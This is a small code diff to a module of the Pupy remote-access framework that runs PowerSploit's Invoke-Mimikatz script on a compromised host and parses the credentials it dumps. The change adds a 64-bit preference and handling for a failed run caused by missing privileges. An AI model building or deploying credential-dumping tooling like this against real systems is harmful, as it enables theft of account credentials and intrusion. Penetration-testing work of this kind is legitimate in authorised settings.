@@ -24,8 +24,10 @@ class Mimikatz_Powershell(PupyModule):
         content = open(os.path.join(ROOT, "external", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"), 'r').read()
         function = 'Invoke-Mimikatz'
 
-        output = execute_powershell_script(self, content, function)
-        
+        output = execute_powershell_script(self, content, function, x64IfPossible=True)
+        if not output:
+            self.error("Error running mimikatz. Enough privilege ?")
+            return
         self.success("%s" % output)
         
         creds = self.parse_mimikatz(output)
